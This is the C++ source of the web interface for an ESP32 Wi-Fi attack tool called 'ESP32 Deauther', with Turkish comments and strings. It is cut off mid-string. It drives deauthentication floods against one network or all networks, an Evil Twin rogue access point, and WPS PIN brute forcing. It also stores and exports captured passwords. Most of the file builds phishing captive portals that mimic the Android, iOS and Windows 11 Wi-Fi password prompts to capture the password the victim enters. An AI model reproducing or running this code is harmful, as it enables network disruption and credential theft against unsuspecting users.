#include <WebServer.h>
#include "web_interface.h"
#include "definitions.h"
#include "deauth.h"
#include "evil_twin.h"
#include "passwords.h"
#include "wps_attack.h"

WebServer server(80);
int num_networks = 0;

// ─── Yardımcı ────────────────────────────────────────────────────────────────

static String encTag(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:        return "<span class='tag tag-open'>OPEN</span>";
    case WIFI_AUTH_WEP:         return "<span class='tag tag-wep'>WEP</span>";
    case WIFI_AUTH_WPA_PSK:     return "<span class='tag tag-wpa'>WPA</span>";
    case WIFI_AUTH_WPA2_PSK:    return "<span class='tag tag-wpa'>WPA2</span>";
    case WIFI_AUTH_WPA_WPA2_PSK:return "<span class='tag tag-wpa'>WPA/2</span>";
    default:                    return "<span class='tag tag-wep'>?</span>";
  }
}

static String getEncryptionType(wifi_auth_mode_t t) {
  switch (t) {
    case WIFI_AUTH_OPEN:         return "Open";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA_WPA2_PSK";
    default:                     return "UNKNOWN";
  }
}

static void redirect_root() {
  server.sendHeader("Location", "/");
  server.send(301);
}

// Basit CSS — PROGMEM'e al
static const char CSS[] PROGMEM = R"(
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#c9d1d9;padding:20px}
h1{color:#58a6ff;font-size:1.8em;margin-bottom:4px}
.sub{color:#8b949e;font-size:.82em;margin-bottom:22px}
h2{color:#f0f6fc;font-size:1.05em;margin-bottom:11px;display:flex;align-items:center;gap:8px}
.badge{font-size:.68em;padding:2px 8px;border-radius:10px;font-weight:700}
.b-red{background:#3d1a1a;color:#f85149}
.b-orange{background:#2d1f0e;color:#f0883e}
.b-green{background:#0d2818;color:#3fb950}
.b-blue{background:#0d1f3c;color:#58a6ff}
.b-purple{background:#2d1060;color:#bc8cff}
.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:16px}
table{width:100%;border-collapse:collapse;font-size:.88em}
th{background:#21262d;color:#8b949e;padding:9px 11px;text-align:left;font-weight:600;font-size:.78em;text-transform:uppercase;letter-spacing:.4px}
td{padding:9px 11px;border-top:1px solid #21262d}
tr:hover td{background:#1c2128}
input[type=text],input[type=number],input[type=password]{width:100%;padding:9px 11px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:.9em;margin-bottom:9px;outline:none}
input:focus{border-color:#58a6ff}
.btn{display:inline-block;width:100%;padding:10px;border:none;border-radius:6px;font-size:.88em;font-weight:700;cursor:pointer;transition:opacity .2s}
.btn:hover{opacity:.82}
.btn-blue{background:#1f6feb;color:#fff}
.btn-red{background:#b62324;color:#fff}
.btn-orange{background:#9b4400;color:#fff}
.btn-purple{background:#6e40c9;color:#fff}
.btn-gray{background:#21262d;color:#c9d1d9;border:1px solid #30363d}
.btn-sm{padding:5px 12px;width:auto;font-size:.8em}
.row{display:flex;gap:11px}
.row>*{flex:1}
.statbar{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:11px 15px;margin-bottom:16px;display:flex;gap:22px;flex-wrap:wrap}
.stat .lbl{color:#8b949e;font-size:.72em;text-transform:uppercase;letter-spacing:.4px}
.stat .val{color:#f0f6fc;font-weight:700;font-size:1.1em}
.val.ok{color:#3fb950}.val.danger{color:#f85149}.val.warn{color:#f0883e}
hr{border:none;border-top:1px solid #21262d;margin:14px 0}
.hint{color:#8b949e;font-size:.8em;margin-bottom:9px}
.alert-ok{background:#0d2818;border:1px solid #3fb950;border-radius:6px;padding:11px;margin-bottom:9px;color:#3fb950}
.alert-err{background:#3d1a1a;border:1px solid #f85149;border-radius:6px;padding:11px;margin-bottom:9px;color:#f85149}
.tag{padding:2px 7px;border-radius:4px;font-size:.74em;font-weight:700}
.tag-open{background:#0d2818;color:#3fb950}
.tag-wpa{background:#0d1f3c;color:#58a6ff}
.tag-wep{background:#2d1f0e;color:#f0883e}
.pw-row{display:flex;align-items:center;justify-content:space-between;padding:9px 0;border-top:1px solid #21262d}
.pw-row:first-child{border-top:none}
.pw-info{display:flex;flex-direction:column;gap:3px}
.pw-ssid{font-weight:700;color:#f0f6fc;font-size:.9em}
.pw-pass{font-family:monospace;color:#3fb950;font-size:.95em;background:#0d1117;padding:3px 8px;border-radius:4px}
)";

// ─── Yönetim Ana Sayfası ──────────────────────────────────────────────────────

void handle_root() {
  bool attack_running = evil_twin_active ||
    (deauth_type == DEAUTH_TYPE_SINGLE && deauth_target_ssid[0] != '\0');

  String html = F("<!DOCTYPE html><html lang='tr'><head>"
    "<meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>ESP32 Deauther</title>");
  if (attack_running) html += F("<meta http-equiv='refresh' content='4'>");
  html += F("<style>");
  html += FPSTR(CSS);
  html += F("</style></head><body>");

  html += F("<h1>&#128246; ESP32 Deauther</h1>"
            "<p class='sub'>Wi-Fi guvenlik arac&#305; &mdash; Yaln&#305;zca egitim amacl&#305;</p>");

  // Durum paneli
  html += F("<div class='statbar'>");
  html += "<div class='stat'><div class='lbl'>Ag</div><div class='val'>" + String(num_networks) + "</div></div>";
  html += "<div class='stat'><div class='lbl'>Deauth</div><div class='val danger'>" + String(eliminated_stations) + "</div></div>";
  html += "<div class='stat'><div class='lbl'>Kaydedilen</div><div class='val ok'>" + String(passwords_count()) + "</div></div>";
  if (evil_twin_active) {
    html += "<div class='stat'><div class='lbl'>ET SSID</div><div class='val ok'>" + evil_twin_ssid + "</div></div>";
    html += "<div class='stat'><div class='lbl'>ET Istemci</div><div class='val warn'>" + String(evil_twin_clients) + "</div></div>";
  }
  html += F("</div>");

  // Ağ tablosu
  html += F("<div class='card'><h2>&#128225; Wi-Fi Aglari</h2><table>"
            "<tr><th>#</th><th>SSID</th><th>BSSID</th><th>Kanal</th><th>RSSI</th><th>Sifrelem</th></tr>");
  for (int i = 0; i < num_networks; i++) {
    String ssid_disp = WiFi.SSID(i);
    if (ssid_disp.length() == 0) ssid_disp = "<i style='color:#8b949e'>(Gizli)</i>";
    html += "<tr><td>" + String(i) + "</td><td><b>" + ssid_disp + "</b></td>"
            "<td style='font-size:.8em;color:#8b949e'>" + WiFi.BSSIDstr(i) + "</td>"
            "<td>" + String(WiFi.channel(i)) + "</td>"
            "<td>" + String(WiFi.RSSI(i)) + " dBm</td>"
            "<td>" + encTag(WiFi.encryptionType(i)) + "</td></tr>";
  }
  html += F("</table><hr>"
            "<form method='post' action='/rescan'>"
            "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
            "</form></div>");

  // Deauth tek ağ
  html += F("<div class='card'><h2>&#9889; Deauth Saldirisi <span class='badge b-red'>Tek Ag</span></h2>"
            "<p class='hint'>Belirli bir aga bagli istemcileri kopar.</p>"
            "<form method='post' action='/deauth'>");
  html += "<input type='number' name='net_num' placeholder='Ag Numarasi (0-" + String(max(0, num_networks - 1)) + ")' min='0'>";
  html += F("<input type='number' name='reason' placeholder='Neden Kodu' value='1'>"
            "<button class='btn btn-red' type='submit'>&#9889; Deauth Baslatı</button>"
            "</form></div>");

  // Deauth tümü
  html += F("<div class='card'><h2>&#128165; Tum Aglara Deauth <span class='badge b-orange'>Uyari</span></h2>"
            "<p class='hint'>Tum kanallar tarandi, tum istemciler deauth edilir. Durdurmak icin ESP32 resetlenmelidir.</p>"
            "<form method='post' action='/deauth_all'>"
            "<input type='number' name='reason' placeholder='Neden Kodu' value='1'>"
            "<button class='btn btn-orange' type='submit'>&#128165; Tumune Saldır</button>"
            "</form></div>");

  // Evil Twin
  html += F("<div class='card'><h2>&#128126; Evil Twin <span class='badge b-purple'>Sifre Yakala</span></h2>");
  if (evil_twin_active) {
    html += "<div class='alert-ok'>&#9679; Aktif: <b>" + evil_twin_ssid + "</b> &mdash; " +
            String(evil_twin_clients) + " istemci bagli</div>";
    html += F("<p class='hint'>Istemciler sahte aga baglandiginda otomatik sifre test sayfasi acilir.</p>"
              "<form method='post' action='/stop_evil_twin'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Evil Twin Durdur</button>"
              "</form>");
  } else {
    html += F("<p class='hint'>Hedef agin SSID ini klonlar, gercek AP ye deauth gonderir. Istemci sahte aga baglandi"
              "ginda sifre girmesi istenir. Dogru sifre bulunursa otomatik kaydedilir ve saldiri durur.</p>"
              "<form method='post' action='/evil_twin'>");
    html += "<input type='number' name='net_num' placeholder='Hedef Ag Numarasi (0-" + String(max(0, num_networks - 1)) + ")' min='0'>";
    html += F("<button class='btn btn-purple' type='submit'>&#128126; Evil Twin Baslatı</button>"
              "</form>");
  }
  html += F("</div>");

  // ── WPS PIN Brute Force ──────────────────────────────────────────────────
  html += F("<div class='card'><h2>&#128273; WPS PIN Saldirisi <span class='badge b-blue'>Brute Force</span></h2>");
  if (wps_attack_state == WPS_SUCCESS) {
    html += "<div class='alert-ok'>&#9989; PIN Bulundu! <b>" + String(wps_found_pin) + "</b><br>"
            "SSID: <b>" + String(wps_found_ssid) + "</b><br>"
            "Sifre: <span class='pw-pass'>" + String(wps_found_pass) + "</span></div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Temizle</button>"
              "</form>");
  } else if (wps_attack_state == WPS_ATTACKING) {
    int pct = (wps_total > 0) ? (wps_attempt * 100 / wps_total) : 0;
    html += "<div style='color:#f0883e;background:#2d1a00;border:1px solid #f0883e;"
            "border-radius:6px;padding:11px;margin-bottom:9px'>"
            "&#128260; Deneniyor: <b>" + String(wps_current_pin) + "</b>"
            " &mdash; " + String(wps_attempt) + "/" + String(wps_total) + "</div>";
    html += "<div style='background:#21262d;border-radius:4px;height:8px;margin-bottom:12px'>"
            "<div style='background:#1f6feb;height:8px;border-radius:4px;width:"
            + String(pct) + "%'></div></div>";
    html += F("<form method='post' action='/wps_stop'>"
              "<button class='btn btn-gray' type='submit'>&#9632; Durdur</button>"
              "</form>");
  } else if (wps_attack_state == WPS_EXHAUSTED) {
    html += F("<div class='alert-err'>&#10060; Tum PIN'ler denendi, basarili olamadi.</div>");
    html += F("<form method='post' action='/wps_scan'>"
              "<button class='btn btn-gray' type='submit'>&#128260; Yeniden Tara</button>"
              "</form>");
  } else {
    html += F("<p class='hint'>Hedef routerin WPS PIN'ini dener (vendor + 50 ortak PIN). "
              "Once WPS aglarini tara, hedefi sec, saldirilari baslatı.</p>");
    if (wps_target_count > 0) {
      html += F("<form method='post' action='/wps_attack'>"
                "<select name='target_idx' style='width:100%;margin-bottom:10px;padding:9px;"
                "background:#0d1117;color:#f0f6fc;border:1px solid #30363d;border-radius:6px'>");
      for (int i = 0; i < wps_target_count; i++) {
        String sname = String(wps_targets[i].ssid);
        if (sname.length() == 0) sname = "(Gizli)";
        html += "<option value='" + String(i) + "'>"
              + sname + " &mdash; " + String(wps_targets[i].rssi) + " dBm"
              + " (Kanal " + String(wps_targets[i].channel) + ")</option>";
      }
      html += F("</select>"
                "<button class='btn btn-blue' type='submit' style='margin-bottom:8px'>"
                "&#128273; Saldiri Baslatı</button>"
                "</form><hr style='margin:10px 0'>");
    }
    html += F("<form method='post' action='/wps_scan'>"
              "<button class='btn btn-gray' type='submit'>&#128225; WPS Aglarini Tara</button>"
              "</form>");
  }
  html += F("</div>");

  // Durdur
  html += F("<div class='row' style='margin-bottom:16px'>"
            "<form method='post' action='/stop'>"
            "<button class='btn btn-gray' type='submit'>&#9632; Deauth Durdur</button>"
            "</form></div>");

  // Kaydedilen şifreler
  html += F("<div class='card'><h2>&#128274; Kaydedilen Sifreler");
  int pw_count = passwords_count();
  html += " <span class='badge b-green'>" + String(pw_count) + "</span></h2>";
  if (pw_count == 0) {
    html += F("<p class='hint'>Henuz kaydedilmis sifre yok.</p>");
  } else {
    for (int i = 0; i < pw_count; i++) {
      SavedPassword sp = passwords_get(i);
      html += "<div class='pw-row'><div class='pw-info'>"
              "<span class='pw-ssid'>&#128225; " + sp.ssid + "</span>"
              "<span class='pw-pass'>" + sp.password + "</span>"
              "</div>"
              "<form method='post' action='/delete_pw' style='width:auto'>"
              "<input type='hidden' name='idx' value='" + String(i) + "'>"
              "<button class='btn btn-red btn-sm' type='submit'>&#128465; Sil</button>"
              "</form></div>";
    }
    html += F("<hr><div class='row'>"
              "<form method='post' action='/clear_pw' style='flex:1'>"
              "<button class='btn btn-gray btn-sm' style='width:100%' type='submit'>&#128465; Tumunu Sil</button>"
              "</form>"
              "<a href='/export_pw' style='flex:1;display:block'>"
              "<button class='btn btn-blue btn-sm' style='width:100%' type='button'>&#128229; Indir (.txt)</button>"
              "</a>"
              "</div>");
  }
  html += F("</div></body></html>");

  server.send(200, "text/html", html);
}

// ─── Captive Portal (Evil Twin istemciler için) ───────────────────────────────
// UA tespiti: iPhone/iPad → iOS tasarımı, diğer → Android MD3 tasarımı
// Renk teması: prefers-color-scheme ile cihazdan otomatik alınır

static String portal_android(bool wrong_pass, const String &ssid) {
  // Material Design 3 — ekran görüntüsündeki Android WiFi şifre ekranı
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1'>"
    "<title>");
  h += ssid;
  h += F("</title><style>"
    ":root{"
      "--bg:#1C1B1F;--surf:#2B2930;--on-bg:#E6E1E5;--outline:#938F99;"
      "--focus:#D0BCFF;--primary:#D0BCFF;--on-pri:#381E72;"
      "--hint:#938F99;--err:#F2B8B8;--sep:rgba(147,143,153,.3)"
    "}"
    "@media(prefers-color-scheme:light){"
      ":root{"
        "--bg:#FFFBFE;--surf:#F4EFF4;--on-bg:#1C1B1F;--outline:#79747E;"
        "--focus:#6750A4;--primary:#6750A4;--on-pri:#FFFFFF;"
        "--hint:#49454F;--err:#B3261E;--sep:rgba(121,116,126,.3)"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:'Google Sans',Roboto,sans-serif;background:var(--bg);"
      "color:var(--on-bg);min-height:100vh;padding:16px 20px}"
    ".back{width:40px;height:40px;display:flex;align-items:center;justify-content:center;"
      "border-radius:50%;border:none;background:none;color:var(--on-bg);"
      "cursor:pointer;margin-bottom:28px;padding:0}"
    ".ssid{font-size:28px;font-weight:400;color:var(--on-bg);margin-bottom:36px;"
      "word-break:break-all;letter-spacing:-.2px}"
    ".field{position:relative;margin-bottom:4px}"
    ".finput{width:100%;height:56px;background:transparent;"
      "border:1px solid var(--outline);border-radius:4px;"
      "padding:16px 48px 0 16px;font-size:16px;color:var(--on-bg);"
      "outline:none;appearance:none;-webkit-appearance:none}"
    ".finput:focus{border:2px solid var(--focus)}"
    ".flabel{position:absolute;left:16px;top:50%;transform:translateY(-50%);"
      "font-size:16px;color:var(--outline);pointer-events:none;"
      "transition:all .15s ease;background:var(--bg);padding:0}"
    ".finput:focus~.flabel,.finput:not(:placeholder-shown)~.flabel{"
      "top:10px;transform:none;font-size:12px;color:var(--focus);padding:0 2px"
    "}"
    ".finput:not(:focus)~.flabel{color:var(--outline)}"
    ".eye{position:absolute;right:14px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--outline);"
      "padding:4px;line-height:0}"
    ".hint{font-size:12px;color:var(--hint);margin:4px 0 0 16px}"
    ".errtxt{font-size:12px;color:var(--err);margin:4px 0 0 16px}"
    ".btns{display:flex;justify-content:flex-end;gap:8px;margin-top:40px}"
    ".bcancel{height:40px;padding:0 24px;border-radius:20px;"
      "border:1px solid var(--outline);background:transparent;"
      "color:var(--on-bg);font-size:14px;font-family:inherit;cursor:pointer}"
    ".bconnect{height:40px;padding:0 24px;border-radius:20px;"
      "border:none;background:var(--primary);color:var(--on-pri);"
      "font-size:14px;font-family:inherit;font-weight:500;cursor:pointer}"
    "</style></head><body>"
    "<button class='back' onclick='history.back()'>"
      "<svg width='24' height='24' viewBox='0 0 24 24' fill='currentColor'>"
        "<path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/>"
      "</svg>"
    "</button>"
    "<div class='ssid'>");
  h += ssid;
  h += F("</div>"
    "<p style='font-size:14px;color:var(--hint);margin:-20px 0 22px;line-height:1.5'>"
      "&#128274; L&#252;tfen Wi-Fi &#351;ifrenizi girerek a&#287;a kat&#305;l&#305;n."
    "</p>"
    "<form method='post' action='/submit' id='f'>"
    "<div class='field'>"
      "<input class='finput' type='password' name='password' id='pw' placeholder=' ' autocomplete='off'>"
      "<label class='flabel' for='pw'>&#350;ifre*</label>"
      "<button type='button' class='eye' onclick='togglePw()'>"
        "<svg width='22' height='22' viewBox='0 0 24 24' fill='currentColor'>"
          "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
          "c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"
          "m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/>"
        "</svg>"
      "</button>"
    "</div>");
  if (wrong_pass) {
    h += F("<p class='errtxt'>Yanl&#305;&#351; &#351;ifre. Tekrar deneyin.</p>");
  } else {
    h += F("<p class='hint'>*zorunlu</p>");
  }
  h += F("<div class='btns'>"
      "<button type='button' class='bcancel' onclick='history.back()'>&#304;ptal</button>"
      "<button type='submit' class='bconnect'>Ba&#287;lan</button>"
    "</div>"
    "</form>"
    "<script>function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}</script>"
    "</body></html>");
  return h;
}

static String portal_ios(bool wrong_pass, const String &ssid) {
  // Apple iOS tarzı WiFi parola ekranı
  // Koyu/açık tema: prefers-color-scheme ile cihazdan alınır
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
    "<title>Parolay&#305; Gir</title><style>"
    ":root{"
      "--bg:#F2F2F7;--bg2:#FFFFFF;--text:#000;--text2:rgba(60,60,67,.6);"
      "--sep:rgba(60,60,67,.29);--tint:#007AFF;--ph:rgba(60,60,67,.3);"
      "--err:#FF3B30;--cell:#FFF"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#000;--bg2:#1C1C1E;--text:#FFF;--text2:rgba(235,235,245,.6);"
        "--sep:rgba(84,84,88,.6);--tint:#0A84FF;--ph:rgba(235,235,245,.3);"
        "--err:#FF453A;--cell:#1C1C1E"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}"
    "body{font-family:-apple-system,'SF Pro Text','Helvetica Neue',sans-serif;"
      "background:var(--bg);color:var(--text);min-height:100vh}"
    ".navbar{display:flex;align-items:center;justify-content:space-between;"
      "padding:13px 16px 8px;background:var(--bg)}"
    ".nav-cancel{color:var(--tint);font-size:17px;border:none;background:none;"
      "cursor:pointer;padding:4px 0;font-family:inherit}"
    ".nav-title{font-size:17px;font-weight:600;color:var(--text);letter-spacing:-.4px}"
    ".nav-join{color:var(--tint);font-size:17px;font-weight:600;border:none;"
      "background:none;cursor:pointer;padding:4px 0;font-family:inherit}"
    ".nav-join:disabled{opacity:.4}"
    ".content{padding:24px 16px 0;text-align:center}"
    ".wifi-ico{font-size:56px;margin-bottom:12px;line-height:1}"
    ".ssid-lbl{font-size:20px;font-weight:600;color:var(--text);margin-bottom:6px;"
      "word-break:break-all}"
    ".sub{font-size:13px;color:var(--text2);margin-bottom:28px;line-height:1.5;"
      "padding:0 8px}"
    ".err-box{background:var(--cell);border-radius:10px;padding:10px 16px;"
      "margin-bottom:12px;font-size:13px;color:var(--err);text-align:left}"
    ".cell-group{background:var(--cell);border-radius:10px;overflow:hidden;"
      "margin-bottom:8px}"
    ".cell{display:flex;align-items:center;height:44px;padding:0 12px;"
      "border-bottom:none}"
    ".cell-lbl{font-size:17px;color:var(--text);min-width:72px;flex-shrink:0}"
    ".cell-sep{width:100%;height:.5px;background:var(--sep);margin-left:12px}"
    ".cell-input{flex:1;border:none;background:transparent;font-size:17px;"
      "color:var(--text);outline:none;padding:0 8px;-webkit-appearance:none;"
      "font-family:inherit}"
    ".cell-input::placeholder{color:var(--ph)}"
    ".eye-ios{background:none;border:none;color:var(--text2);cursor:pointer;"
      "font-size:17px;padding:4px 0 4px 8px}"
    "</style></head><body>"
    "<div class='navbar'>"
      "<button class='nav-cancel' onclick='history.back()'>&#304;ptal</button>"
      "<span class='nav-title'>Parolay&#305; Gir</span>"
      "<button class='nav-join' form='f' type='submit' id='joinbtn' disabled>Kat&#305;l</button>"
    "</div>"
    "<div class='content'>"
      "<div class='wifi-ico'>&#128225;</div>"
      "<div class='ssid-lbl'>");
  h += ssid;
  h += F("</div>"
      "<div class='sub'>"
        "&#128274; L&#252;tfen Wi-Fi &#351;ifrenizi girin.<br>"
        "Bu a&#287;a kat&#305;lmak i&#231;in parola gereklidir."
      "</div>");
  if (wrong_pass) {
    h += F("<div class='err-box'>&#128274; Yanl&#305;&#351; parola. L&#252;tfen tekrar deneyin.</div>");
  }
  h += F("<form id='f' method='post' action='/submit'>"
      "<div class='cell-group'>"
        "<div class='cell'>"
          "<span class='cell-lbl'>Parola</span>"
          "<input class='cell-input' type='password' name='password' id='pw'"
            " placeholder='Gerekli' autocomplete='off'"
            " oninput='document.getElementById(\"joinbtn\").disabled=this.value.length<1'>"
          "<button type='button' class='eye-ios' onclick='togglePw()'>&#128065;</button>"
        "</div>"
      "</div>"
    "</form>"
    "</div>"
    "<script>function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}</script>"
    "</body></html>");
  return h;
}

static String portal_desktop(bool wrong_pass, const String &ssid) {
  // Windows 11 WiFi bağlantı flyout'u tarzı — masaüstü tarayıcılar için
  // Koyu/açık tema: prefers-color-scheme ile otomatik
  String h = F("<!DOCTYPE html><html><head>"
    "<meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Connect to ");
  h += ssid;
  h += F("</title><style>"
    ":root{"
      "--bg:#F3F3F3;--card:#FFFFFF;--text:#1A1A1A;--text2:#5D5D5D;"
      "--border:#E0E0E0;--input-bg:#FAFAFA;--input-border:#ABABAB;"
      "--accent:#0078D4;--accent-h:#006CBE;--btn-cancel-bg:#F0F0F0;"
      "--btn-cancel-h:#E5E5E5;--btn-cancel-txt:#1A1A1A;"
      "--shadow:rgba(0,0,0,.12);--err:#C42B1C;--err-bg:#FDE7E9"
    "}"
    "@media(prefers-color-scheme:dark){"
      ":root{"
        "--bg:#202020;--card:#2C2C2C;--text:#FFFFFF;--text2:#ABABAB;"
        "--border:#404040;--input-bg:#3C3C3C;--input-border:#606060;"
        "--accent:#60CDFF;--accent-h:#45C0F8;--btn-cancel-bg:#3C3C3C;"
        "--btn-cancel-h:#474747;--btn-cancel-txt:#FFFFFF;"
        "--shadow:rgba(0,0,0,.4);--err:#FF9494;--err-bg:#3D1A1A"
      "}"
    "}"
    "*{box-sizing:border-box;margin:0;padding:0}"
    "body{font-family:'Segoe UI Variable','Segoe UI',system-ui,sans-serif;"
      "background:var(--bg);min-height:100vh;"
      "display:flex;align-items:center;justify-content:center;padding:20px}"
    ".card{background:var(--card);border:1px solid var(--border);"
      "border-radius:8px;padding:24px 28px 20px;"
      "width:100%;max-width:360px;"
      "box-shadow:0 4px 20px var(--shadow)}"
    ".top{display:flex;align-items:center;gap:12px;margin-bottom:18px}"
    ".wifi-icon{width:40px;height:40px;flex-shrink:0;"
      "display:flex;align-items:center;justify-content:center;"
      "background:var(--accent);border-radius:50%;color:#fff;font-size:20px}"
    ".top-text .ssid{font-size:14px;font-weight:600;color:var(--text);"
      "word-break:break-all;line-height:1.3}"
    ".top-text .sub{font-size:12px;color:var(--text2);margin-top:2px}"
    ".divider{border:none;border-top:1px solid var(--border);margin:0 -28px 18px}"
    ".field-label{font-size:12px;color:var(--text2);margin-bottom:5px;display:block}"
    ".field-wrap{position:relative;margin-bottom:6px}"
    ".field-input{width:100%;height:32px;background:var(--input-bg);"
      "border:1px solid var(--input-border);border-radius:4px;"
      "padding:0 36px 0 10px;font-size:13px;color:var(--text);"
      "font-family:inherit;outline:none}"
    ".field-input:focus{border-color:var(--accent);"
      "box-shadow:0 0 0 1px var(--accent)}"
    ".eye-btn{position:absolute;right:8px;top:50%;transform:translateY(-50%);"
      "background:none;border:none;cursor:pointer;color:var(--text2);"
      "font-size:15px;padding:0;line-height:1;display:flex;align-items:center}"
    ".err-box{background:var(--err-bg);border-radius:4px;"
      "padding:8px 10px;margin-bottom:12px;"
      "font-size:12px;color:var(--err);display:flex;gap:6px;align-items:center}"
    ".hint{font-size:11px;color:var(--text2);margin-bottom:16px}"
    ".check-row{display:flex;align-items:center;gap:8px;margin-bottom:18px}"
    ".check-row input{width:14px;height:14px;accent-color:var(--accent);cursor:pointer}"
    ".check-row label{font-size:12px;color:var(--text2);cursor:pointer}"
    ".btn-row{display:flex;justify-content:flex-end;gap:8px}"
    ".btn{height:32px;padding:0 16px;border-radius:4px;"
      "font-size:13px;font-family:inherit;cursor:pointer;border:none;"
      "font-weight:400;letter-spacing:0}"
    ".btn-cancel{background:var(--btn-cancel-bg);color:var(--btn-cancel-txt);"
      "border:1px solid var(--border)}"
    ".btn-cancel:hover{background:var(--btn-cancel-h)}"
    ".btn-connect{background:var(--accent);color:#fff;font-weight:600}"
    "@media(prefers-color-scheme:dark){.btn-connect{color:#1A1A1A}}"
    ".btn-connect:hover{background:var(--accent-h)}"
    "</style></head><body>"
    "<div class='card'>"
      "<div class='top'>"
        "<div class='wifi-icon'>&#128225;</div>"
        "<div class='top-text'>"
          "<div class='ssid'>");
  h += ssid;
  h += F("</div>"
          "<div class='sub'>Kilitli &bull; Parola gerekli</div>"
        "</div>"
      "</div>"
      "<hr class='divider'>"
      "<p style='font-size:13px;color:var(--text2);margin-bottom:14px;line-height:1.5'>"
        "&#128274; L&#252;tfen Wi-Fi &#351;ifrenizi girerek a&#287;a ba&#287;lan&#305;n."
      "</p>");
  if (wrong_pass) {
    h += F("<div class='err-box'>"
        "<span>&#9888;</span>"
        "<span>A&#287;&#305;n parolas&#305; yanl&#305;&#351;. Tekrar deneyin.</span>"
      "</div>");
  }
  h += F("<form method='post' action='/submit'>"
      "<label class='field-label' for='pw'>A&#287; g&#252;venlik anah tar&#305;</label>"
      "<div class='field-wrap'>"
        "<input class='field-input' type='password' name='password' id='pw'"
          " placeholder='Parolay&#305; girin' autocomplete='off'>"
        "<button type='button' class='eye-btn' onclick='togglePw()' title='G&#246;ster/Gizle'>"
          "<svg width='16' height='16' viewBox='0 0 24 24' fill='currentColor'>"
            "<path d='M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5"
            "c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"
            "m0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z'/>"
          "</svg>"
        "</button>"
      "</div>"
      "<p class='hint'>Parola en az 8 karakter olmal&#305;d&#305;r.</p>"
      "<div class='check-row'>"
        "<input type='checkbox' id='auto' checked>"
        "<label for='auto'>Bu a&#287;a otomatik ba&#287;lan</label>"
      "</div>"
      "<div class='btn-row'>"
        "<button type='button' class='btn btn-cancel' onclick='history.back()'>&#304;ptal</button>"
        "<button type='submit' class='btn btn-connect'>Ba&#287;lan</button>"
      "</div>"
    "</form>"
    "</div>"
    "<script>function togglePw(){"
      "var p=document.getElementById('pw');"
      "p.type=p.type==='password'?'text':'password'"
    "}</script>"
    "</body></html>");
  return h;
}

static String portal_page(bool wrong_pass) {
  String ua = server.header("User-Agent");

  // iOS tespiti
  bool is_ios = ua.indexOf("iPhone") >= 0 ||
                ua.indexOf("iPad")   >= 0 ||
                ua.indexOf("iPod")   >= 0;
  if (is_ios) return portal_ios(wrong_pass, evil_twin_ssid);

  // Android tespiti (masaüstü UA'sında "Android" geçmez)
  bool is_android = ua.indexOf("Android") >= 0;
  if (is_android) return portal_android(wrong_pass, evil_twin_ssid);

  // Windows, macOS, Linux, ChromeOS vb. masaüstü / diğer
  return portal_desktop(wrong_pass, evil_twin_ssid);
}

static void handle_portal() {
  if (!evil_twin_active) { redirect_root(); return; }
  server.send(200, "text/html", portal_page(false));
}

static void handle_portal_wrong() {
  if (!evil_twin_active) { redirect_root(); return; }
  server.send(200, "text/html", portal_page(true));
}

// ─── Submit: test durumu — main.cpp loop'tan erişilir (extern) ───────────────
bool   et_test_pending   = false;  // main loop testi çalıştırsın
bool   et_result_ready   = false;  // test tamamlandı
bool   et_result_correct = false;  // sonuç
String et_tested_ssid     = "";
String et_tested_password = "";

static void handle_submit() {
  if (!evil_twin_active) { redirect_root(); return; }

  String password = server.arg("password");
  password.trim();

  if (password.length() < 8) {
    server.sendHeader("Location", "/portal_wrong");
    server.send(302);
    return;
  }

  // Durumu ayarla — main loop testi alır
  et_test_pending   = true;
  et_result_ready   = false;
  et_result_correct = false;
  et_tested_ssid    = evil_twin_ssid;
  et_tested_password = password;

  // Handler HEMEN döner — TCP flush garantisi için blocking YOK
  // Tarayıcı "test ediliyor" sayfasını alır, 12s sonra /test_result'a gider
  server.send(200, "text/html", F(
    "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
